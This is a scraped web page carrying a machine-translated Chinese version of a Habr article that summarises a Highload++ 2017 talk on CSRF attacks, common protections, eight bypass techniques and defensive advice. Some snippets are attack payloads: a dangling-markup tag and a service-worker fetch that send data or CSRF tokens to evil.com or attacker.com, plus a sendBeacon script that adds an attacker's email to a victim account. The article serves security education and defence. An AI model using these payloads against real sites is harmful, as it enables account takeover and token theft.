<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧗🏾 🗓️ 👨🏽‍🚀 CSRF漏洞仍然相关 👩🏾‍🎓 ⚱️ 🔵</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="翻译成俄语的CSRF（跨站请求伪造）是跨站请求的伪造。 Mikhail Egorov （ 0ang3el ）在有关Highload ++ 2017的报告中谈到了CSRF漏洞，通常使用哪种保护机制以及如何规避它们。 最后，他提出了有关如何防御CSRF攻击的一系列技巧。 根据猫的解码表现。 


 关于...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>CSRF漏洞仍然相关</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/oleg-bunin/blog/412855/"> 翻译成俄语的CSRF（跨站请求伪造）是跨站请求的伪造。  <strong>Mikhail Egorov</strong> （ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">0ang3el</a> ）在有关<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Highload ++</a> 2017的报告中谈到了CSRF漏洞，通常使用哪种保护机制以及如何规避它们。 最后，他提出了有关如何防御CSRF攻击的一系列技巧。 根据猫的解码表现。 <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/x5AuK_IbJlg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <strong>关于演讲者：</strong> Mikhail Egorov在Ingram Micro Cloud工作，从事应用程序安全性。 在闲暇时间，Mikhail致力于寻找漏洞和寻找Bug并在安全会议上发表演讲。 <br><br>  <strong>免责声明：</strong>给出的信息纯粹是作者的意见，所有匹配内容都是随机的。 <br><img src="https://habrastorage.org/webt/rx/zu/uu/rxzuuu_ccpo8uw9opgjbutrs-hk.jpeg"><br><br> 这个Cookie怪兽应该归咎于CSRF攻击有效的事实。 事实是，许多Web应用程序都使用cookie（此后我们认为以俄语调用cookie是适当的）来控制用户的会话。 浏览器的设计使其在此域和路径具有用户cookie时会自动将其与HTTP请求一起发送。 <br><a name="habracut"></a><br><h3> 饼干 <br></h3><br>  Cookie是Web服务器以称为“ Set-Cookie”的HTTP标头中的name = value的形式发送给客户端的一小段数据。 浏览器将此数据存储在用户的计算机上，并在必要时将此数据作为HTTP请求的一部分发送到Web服务器，该HTTP请求称为“ Cookie”。 <br><br>  Cookies可以具有各种属性，例如：过期，域，安全，httponly： <br><br>  Cookies最早于1994年出现在Netscape浏览器中。 许多Web应用程序仍然使用它们来管理用户的会话。 <br><img src="https://habrastorage.org/webt/ja/hh/ue/jahhuedxwbccdc82v97tqub7geq.jpeg"><br><br> 让我们看看经典的跨站请求伪造（CSRF）攻击是如何工作的。 <br><br> 假设我们的Web应用程序具有更改用户的传递地址的能力，并且使用Cookie来控制会话。 <br><br> 我们有一个HTML表单，用户必须填写：输入地址，然后单击“保存”按钮。 结果，带有HTML表单的POST请求将飞到后端。 我们看到浏览器会自动在其中设置用户的会话Cookie。 后端在收到这样的请求时，会发现存在这样的会话，它是合法用户，并更改其传递地址。 <br><br> 攻击者可以做什么？ <br><img src="https://habrastorage.org/webt/3n/cn/eh/3ncnehuga46_ltfvzfsgm3pb1ii.jpeg"><br><br> 他可以在自己的<em>Attacker.com</em>网站上放置一个HTML页面，该页面实际上将HTML表单提交给<em>example</em> <em>。</em>  <em>com</em> 。 由于浏览器会自动将用户的Cookie插入HTTP请求中，因此后端根本无法理解该请求是否合法-是用户填写表单的结果还是CSRF攻击-并将用户的传递地址更改为对攻击者有利的值。 <br><br> 使用XHR API的CSRF攻击还有另一种选择。 如果许多人听说过使用HTML表单的CSRF攻击，那么他们对这种方法的了解就很少，但是它也可以使用。 <br><img src="https://habrastorage.org/webt/vn/tw/s3/vntws3ykrle2c_xr6ztikub5q60.jpeg"><br><br> 注意withCredentials属性，该属性使浏览器自动发送用户cookie。 由于Content-type的值是application / x-www-form-urlencoded，因此浏览器将发送此请求而无需CORS选项预检请求，并且CSRF攻击将再次起作用。 <br><br> 让我们更清楚地考虑这是如何发生的。 <br><img src="https://habrastorage.org/webt/ry/w2/dq/ryw2dquhy1hnddg0mkufscf8k4m.jpeg"><br><br> 源数据： <br><br><ul><li>  <i>exampleRF.com</i>应用容易受到CSRF的攻击， <br></li><li> 使用者 <br></li><li> 攻击者的网站，那里有一个csrf-xhr.html页面。 <br></li></ul><br> 用户在位于<i>example.com</i>上的应用程序中通过了身份验证。 如果他去了攻击者的站点，那么将自动执行POST请求，这将更改传递地址。 浏览器将自动将会话cookie插入请求，后端将更改地址。 <br><br><h2>  CSRF攻击历史 <br></h2><br> 总的来说，CSRF攻击自2001年开始被人们广泛利用以来就已为人所知。 在2008-2012年期间，每个第一个站点上都存在此类漏洞，包括： <br><br><ol><li>  YouTube的 <br></li><li> 纽约时报； <br></li><li> 巴杜 <br></li><li> 幻灯片分享 <br></li><li>  Vimeo; <br></li><li> 葫芦 <br></li><li> 电影搜索； <br></li><li>  ... <br></li></ol><br><h2>  CSRF漏洞有多严重？ <br></h2><br> 实际上，这完全取决于脆弱行动的关键性。 可能是： <br><br><ul><li> 帐户接管-攻击者通过CSRF更改电子邮件来捕获受害者的帐户。 <br></li><li> 特权升级-由于攻击者通过CSRF创建了系统中具有较高权限的新用户，从而增加了特权。 <br></li><li> 远程执行代码-由于通过CSRF在管理面板中进行了命令注入操作，因此执行了代码。 <br></li></ul><br> 让我们看看国际上建立的关于CSRF严重性的漏洞分类。 <br><br> 在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">OWASP Top 10</a>项目中，该项目包含应用程序中的10个最关键的漏洞，在2010年，CSRF漏洞<strong>排名第五</strong> 。 然后，开发人员开始实施各种保护选项，并且在2013年，CSRF漏洞已移至第八位。 <br><br>  CSRF漏洞根本没有列入2017年的列表中，因为据推测，根据统计数字，现在<strong>仅在8％的案例中</strong>发现了CSRF漏洞。 <br><br> 我个人不同意这些统计数据，因为从字面上看，最近两年我发现了许多CSRF漏洞。 接下来，我将告诉您我是如何做到的。 <br><br> 在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Bugcrowd VRT</a> （漏洞等级分类）类别中，应用程序范围的CSRF漏洞的严重等级为P2（高）。 以上仅是严重性级别，即这些都是<strong>非常严重的漏洞</strong> 。 <br><img src="https://habrastorage.org/webt/oh/2p/lv/oh2plvuhqczibq9rm4lmogh1ugi.jpeg"><br><br> 考虑存在哪些CSRF保护选项以及每个保护选项的工作方式。 <br><br>  <strong>1. CSRF令牌</strong> <br><ul><li> 对于每个用户会话，都会生成一个唯一且<strong>高度</strong>熵的令牌。 <br></li><li> 令牌被插入HTML页面的DOM中，或通过API给予用户。 <br></li><li> 每个请求都与任何更改相关联的用户必须在参数或请求的HTTP标头中发送令牌。 <br></li><li> 由于攻击者不知道令牌，因此经典CSRF攻击无效。 <br></li></ul><br>  <strong>2.两次提交Cookie</strong> <br><ul><li> 再次为每个用户会话生成一个唯一且<strong>高度</strong>熵的令牌，但是将其放置在cookie中。 <br></li><li> 用户必须在请求中的请求和请求参数中传递相同的值。 <br></li><li> 如果这两个值在Cookie和参数中一致，则认为这是合法请求。 <br></li><li> 由于攻击者根本无法在用户的浏览器中更改cookie，因此经典的CSRF攻击无效。 <br></li></ul><br>  <strong>3.基于内容类型的保护</strong> <br><ul><li> 用户必须发送带有特定Content-Type标头的请求，例如application / json。 <br></li><li> 由于不可能在浏览器中通过HTML表单或XHR API发送任意的Content-Type跨域，因此经典的CSRF攻击不再起作用。 <br></li></ul><br>  <strong>4.基于引荐的保护</strong> <br><ul><li> 用户必须发送带有特定Referer标头值的请求。 后端对其进行检查，如果不正确，则认为这是CSRF攻击。 <br></li><li> 由于浏览器无法通过HTML表单或XHR API发送任意引用，因此经典的CSRF攻击无效。 <br></li></ul><br>  <strong>5.密码确认/ websudo</strong> <br><ul><li> 用户必须使用密码（或密码）确认操作。 <br></li><li> 由于攻击者不认识他，因此经典的CSRF攻击无效。 <br></li></ul><br>  <strong>6. Chrome，Opera中的SameSite Cookies</strong> <br> 这是一项旨在保护CSRF的新技术。 目前，它仅在两种浏览器（Chrome，Opera）中有效。 <br><br><ul><li>  Cookie设置了一个附加属性-samesite，该属性可以具有两个值：lax或strict。 <br></li><li> 该技术的本质是，如果请求是从另一个域（例如，攻击者的网站）发出的，则浏览器不会发送cookie。 因此，这再次防止了经典的CSRF攻击。 <br></li></ul><br> 但是，不幸的是，到处都有浏览器，Web应用程序及其部署的功能，有时<strong>可以让您绕过CSRF保护</strong> 。 <br><br> 因此，现在让我们讨论可以在实践中使用的<strong>8种绕过保护</strong>的方法。 <br><img src="https://habrastorage.org/webt/fh/tk/rx/fhtkrxcjtbvw2mfyxctik-zqizc.jpeg"><br><br><h3>  <strong>解决方法：</strong> <br></h3><br>  <strong>1. XSS（跨站点脚本）</strong> <br><br> 如果您的Web应用程序具有XSS，则这会自动使其容易受到CSRF的攻击，因此很难保护自己。  <strong>你只能忍受</strong> 。 <br><br>  <strong>2.悬挂标记</strong> <br><br> 假设我们的应用程序存在HTML注入漏洞，但是没有XSS。 例如，有一个针对XSS的内容安全策略（CSP）。 但是攻击者仍然可以嵌入HTML标签。 <br><br> 如果我们的应用程序基于CSRF令牌实施保护，则攻击者可以嵌入此类HTML，这些HTML并非封闭的图像或表单标签： <br><br><pre><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'https://evil.com/log_csrf?html= &lt;form action='</span></span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">evil.com</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">log_csrf</span></span></span><span class="hljs-tag">'&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">textarea</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br> 结果，部分DOM HTML页面将被发送到攻击者的资源。 如果攻击者正确实现了此类HTML，则很有可能在攻击者的网站上包含CSRF令牌。 <br><br> 因此，在学习了令牌之后，攻击者将能够以经典方式利用CSRF。 <br><br>  <strong>3.脆弱的子域</strong> <br><br> 假设我们有一个子域<em>foo.example.com</em> ，并且容易受到<strong>子域接管</strong>或<strong>XSS的</strong>攻击<strong>。</strong> 子域接管的结果是，攻击者可以完全控制该子域，并且可以在该子域中添加任何HTML页面或在该子域的上下文中执行JS代码。 如果我们的子域容易受到此类攻击，则攻击者将能够规避以下类型的CSRF保护： <br><br><ul><li>  CSRF令牌； <br></li><li> 两次提交Cookie； <br></li><li> 基于内容类型的保护。 <br></li></ul><br> 假设我们的主要应用程序使用<strong>CORS</strong> （跨源资源共享）进行跨域通信。 服务器响应中插入了两个标头： <br><br><ol><li> 访问控制允许来源：foo.example.com（foo.example.com-易受攻击的子域）； <br></li><li> 访问控制允许证书：true <strong>&nbsp;</strong>  -因此，使用XHR API可以使用用户cookie发出请求。 <br></li></ol><br> 如果满足这些条件，则攻击者可以简单地从他控制的子域中读取CSRF令牌，然后继续以经典方式利用CSRF。 <br><br> 下一个选项。 假设我们要攻击的主域上有一个<strong>crossdomain.xml</strong>文件。  Flash和PDF插件使用此文件进行子域交互，并允许从任何子域访问该文件。 <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">allow-access-from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"*.example.com"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br> 如果攻击者可以将JS文件上传到<i>foo.example.com</i> ，那么在这种情况下，他可以将Service Worker API用于子域foo.example.com，而该子域实际上会发出Flash文件。 <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">"https://attacker.com/bad.swf"</span></span>; onfetch = <span class="hljs-function"><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) =&gt;</span></span> { e.respondWith(fetch(url); }</code> </pre><br> 由于我们在主域上具有crossdomain.xml，它允许子域进行交互，因此攻击者只需通过此SWF读取CSRF令牌。 <br><br><blockquote> 顺便说一句，最近在亚马逊上发现了一个类似的漏洞，更多详细信息<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在这里</a> 。 <br></blockquote><br> 即使未配置CORS且没有crossdomain.xml文件，但使用了Double Submit Cookie保护，攻击者也可以将Cookie从父域的子域插入到他要利用CSRF的路径，从而绕过Double Submit Cookie保护。 <br><br>  <strong>4.错误的PDF</strong> <br><br> 此解决方法基于PDF。  Adobe有一个PDF插件，当您安装Adobe Reader时会自动安装。 该插件支持所谓的FormCalc脚本。 但是，现在Adobe的PDF插件仅适用于IE11和Firefox ESR。 <br><br>  FormCalc有两种很棒的方法：get（）和post（）。 使用get方法的攻击者可以使用post读取CSRF令牌，并将其发送到他的站点。 因此，攻击者获得了受害者的CSRF令牌。 <br><br> 假设我们有能力将PDF文件上传到Web应用程序。 实际上，它甚至可能是不同格式的文件，例如，攻击者可能试图以用户头像的图片为幌子下载PDF。 <br><br> 该应用程序在主域上具有一些API，使您可以获取下载文件的内容。 然后，攻击者可以使用HTML页面，该页面嵌入使用embed标签将攻击者上传到<i>example.com</i>的PDF文件。 <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Nothing to see here!<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">embed</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://example.com/shard/x1/sh/leak.pdf"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'application/pdf'</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <strong>Leak.pdf</strong>文件： <br><img src="https://habrastorage.org/webt/ua/nb/7w/uanb7wix-egv6kro7ntqby84gnm.jpeg"><br><br> 该文件包含一个FormCalc脚本，该脚本仅读取Settings.action页，该页在DOM中有一个CSRF令牌，并使用post方法将其发送到攻击者的站点。 <br><br> 由于PDF是从example.com下载的，因此该PDF本身具有对所有起源<code>https://example.com</code>完全访问权限，并且可以从那里读取数据而不会违反相同起源策略（SOP）模式。 <br><br> 另一个重点是，对于PDF插件而言，与给出哪种Content-Type无关紧要，甚至HTTP响应也可能包含其他标头（例如Content-Disposition）。  PDF插件仍将呈现此PDF并执行FormCalc脚本。 <br><br>  <strong>5.饼干注射</strong> <br><br> 如果使用了双重提交cookie保护，那么如果攻击者可以某种方式引入cookie，那么这已经结束了。 <br><br> 在这种情况下，最受欢迎的选择之一是<strong>CRLF</strong> <strong>注入</strong> 。 <br><br> 如果攻击者可以在服务器的响应中插入其他标头，则只需添加带有必要Cookie的Set-Cookie标头，并绕过CSRF保护。 <br><br> 另一个选项与<strong>浏览器cookie处理功能有关</strong> 。 <br><br> 例如，在Safari中，您可以使用逗号插入新的cookie（以逗号分隔的cookie）。 假设我们在名为language的标头中有一个URL参数。 我们对其进行处理，然后将所选的语言值写入Cookie中。 如果攻击者插入逗号，则他可以插入任何其他名称的cookie。 <br><br> 同样，绕过CSRF保护也可以帮助解决<strong>浏览器错误</strong> 。 例如，在Firefox中，可以通过SVG图像嵌入Cookie（ <strong>CVE-2016-9078）</strong> 。 如果我们有HTML编辑器，并且允许用户插入图像标签，那么攻击者可以简单地指向SRC属性中的SVG图像，这将设置必要的cookie。 <br><br>  <strong>6.更改内容类型</strong> <br><blockquote> 一些开发人员认为，如果您在POST请求的正文中使用非标准数据格式与后端进行通信，则可以使您免于CSRF。 实际上并非如此。 <br></blockquote><br> 例如，我将列举一个最近在非常流行的笔记管理服务中发现的漏洞。 <br><br> 它使用的API使用Apache Thrift（二进制数据格式）和cookie来控制会话。 例如，要添加新笔记，用户必须发送这样的POST请求。 二进制数据在正文中传输，并且指定了Content-Type：application / x-thrift。 <br><br><pre> <code class="hljs powershell">POST /user/add/note HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: example.com User<span class="hljs-literal"><span class="hljs-literal">-Agent</span></span>: Mozilla/<span class="hljs-number"><span class="hljs-number">5.0</span></span> (X11; Linux x86_64; rv:<span class="hljs-number"><span class="hljs-number">45.0</span></span>) Gecko/<span class="hljs-number"><span class="hljs-number">20100101</span></span> Firefox/<span class="hljs-number"><span class="hljs-number">45.0</span></span> Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number"><span class="hljs-number">0.9</span></span>,*/*;q=<span class="hljs-number"><span class="hljs-number">0.8</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Language</span></span>: en<span class="hljs-literal"><span class="hljs-literal">-US</span></span>,en;q=<span class="hljs-number"><span class="hljs-number">0.5</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Encoding</span></span>: gzip, deflate Referer: https://example.com Cookie: JSESSIONID=<span class="hljs-number"><span class="hljs-number">728</span></span>FAA7F23EE00B0EDD56D1E220C011E.jvmroute8081; Connection: close Content<span class="hljs-literal"><span class="hljs-literal">-Type</span></span>: application/x<span class="hljs-literal"><span class="hljs-literal">-thrift</span></span> Content<span class="hljs-literal"><span class="hljs-literal">-Length</span></span>: <span class="hljs-number"><span class="hljs-number">43</span></span></code> </pre><br> 实际上，此Content-Type在后端未经过验证。 只需将二进制数据传递到POST请求的主体中，就可以将其更改为text / plain，并使用XHR API来利用此CSRF漏洞。 <br><img src="https://habrastorage.org/webt/pl/cv/yk/plcvykuxz09ts4h6aooogmms_pe.jpeg"><br><br> 实际上，基于内容类型的安全性是非常差的安全性选项。 大多数情况下会绕过它。 <br><br>  <strong>7.非简单的内容类型</strong> <br><br> 通过HTML表单或使用XHR API，我们可以提交以下内容类型： <br><br><ul><li> 文字/纯文字； <br></li><li> 应用程序/ x-www-form-urlencoded; <br></li><li> 多部分/表单数据。 <br></li></ul><br> 实际上，可以通过以下方式发送任何Content-Type值： <br><br><ul><li> 浏览器中的错误（例如Navigator.sendBeacon）； <br></li><li> 插件：Flash插件+ 307重定向和PDF插件+ 307重定向； <br></li><li> 后端框架。 <br></li></ul><br> 某些框架（例如JAX-RS Apache CXF框架）在URL中支持<strong>称为ctype</strong>的参数。 您可以在此参数中指定任何Content-Type，后端将查看此参数并将使用它，而不是Content-Type，后者将传递到标头（ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">链接</a>到源）。 <br><br>  Chrome浏览器在2015年发现了一个相当<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">知名的错误</a> ，此后大约一个月便进入了公众访问范围，但直到2017年才修复。 此错误使您可以使用称为<strong>Navigator.sendBeacon（）</strong>的API将具有任何Content-Type的POST请求发送到另一个来源<strong>。</strong> <br> 手术看起来像什么？ <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span class="hljs-function"><span class="hljs-title">jsonreq</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> data = </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'{"action":"add-user-email","Email":"attacker@evil.com"}'</span></span></span><span class="actionscript">; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> blob = </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">new</span></span></span><span class="actionscript"> Blob([data], {type : </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'application/json;charset=utf-8'</span></span></span><span class="actionscript">}); navigator.sendBeacon(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'https://example.com/home/rpc'</span></span></span><span class="actionscript">, blob ); } jsonreq(); </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br> 我们使用所需的Content-Type创建一个新的Blob，然后只需使用Navigator.sendBeacon（）发送即可。 <br><br> 仍然有效且在浏览器中受支持的另一种解决方法是使用Flash插件绕过。 <br><img src="https://habrastorage.org/webt/uv/dy/1x/uvdy1xpch21cebolskgfj6kk53q.jpeg"><br><br> 即使有一个网站<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">thehackerblog.com</a> ，那里已经有一个就绪的闪存驱动器，您只需指定URL，标头，所需的Content-Type和您需要传输的数据-您就可以发送，并且带有所需Content-Type的POST请求会飞到后端。 <br><br> 但是有一个窍门-您不能仅指定我们要攻击的网站的URL。 您需要指定将在我们攻击的资源上<strong>使用代码307</strong>进行<strong>重定向</strong>的资源。 然后它将起作用。 <br><br>  <strong>8.欺骗引荐来源</strong> <br><br> 绕过CSRF保护的最后一个选项是基于Referer。  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Microsoft Edge</a>浏览器中存在一个<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">错误，该错误</a>仍未修复，可以让您伪造Referer的值。 但是，不幸的是，它仅对GET请求有效。 如果受攻击的后端无法区分GET和POST，则可以利用此bug。 <br><br> 如果我们仍然需要POST，则有一个小技巧。 我们可以使用PDF插件和FormCalc发送标头参考。 <br><img src="https://habrastorage.org/webt/yu/iu/vw/yuiuvwwn-xj4llbso7bhkscb7nc.jpeg"><br><br> 大约一年前，可以使用PDF插件发送包括主机在内的所有标题，但随后Adobe通过创建标题黑名单来消除这种可能性。 也就是说，如果我们在标头中指定Referer，则该标头就不会存在。 <br><br> 通常，FormCalc允许我们合法地提交任何Content-Type。 如果我们插入回车符和换行符，则可以向请求中添加其他标题。 <br><br> 如果实现标头<code>Referer http://example.com</code>会发生什么？ <br><br> 显然，它不在黑名单中，标题为<code>Referer http://example.com</code>的标头将发送到后端。 <br><br> 某些服务器，例如WildFly或Jboss，会将<strong>空格</strong>视为HTTP标头名称的末尾，即冒号` <strong>：</strong> `。 因此，这些服务器将看到Referer带有值<code>http://example.com</code> 。 因此，我们将替换Referer。 <br><img src="https://habrastorage.org/webt/mb/7x/gu/mb7xgu42xmzrfmrgiane0pb_zck.jpeg"><br><br> 这是汇总表。 列提供了针对CSRF的保护，行提供了解决方法。 在每个单元格中，指示使用此方法的浏览器： <br><br><ul><li> 适用于所有浏览器的一切； <br></li><li> 所有*表示不支持SameSite Cookies的浏览器，即 除Chrome和Opera外的所有内容。 <br></li></ul><br><img src="https://habrastorage.org/webt/e7/pg/-v/e7pg-vuidm5muwr1cifi0hthawu.jpeg"><br><br> 抵御CSRF攻击的最主要，最有效的选择是摆脱cookie并使用带有令牌的标头。 <br><br> 但是，如果您仍不愿意放弃cookie来管理用户会话，请执行以下操作： <br><br><ul><li> 对威胁建模并验证CSRF保护的实施<strong><em>（请参见摘要表）。</em></strong> <br></li><li> 实施SameSite Cookies。 现在只有两种浏览器支持，但是将来可能会更多。 <br></li><li> 结合各种CSRF防御-纵深防御。 <br></li><li> 要求用户输入密码以执行关键操作。 <br></li><li> 提供用户从单独域下载的文件。 <br></li></ul><br><blockquote> 在不到六个月的时间里，下一个高负载将在一个月内出现<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">-Highload ++ Siberia</a> 。 <br><br> 我们想提请您注意一些选定的报告： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">我为所有人哭泣！</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">我们如何在不使用我们自己的计费的情况下集成支付系统</a> / Anton Rusakov。 <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">njs-</a> Nginx / Dmitry Volintsev中的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">本机JavaScript脚本</a> 。 <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PG Saga：几种服务中的依赖数据更改，没有两阶段提交和同步依赖关系</a> / Konstantin Evteev。 <br></li></ul><br></blockquote></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN412855/">https://habr.com/ru/post/zh-CN412855/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
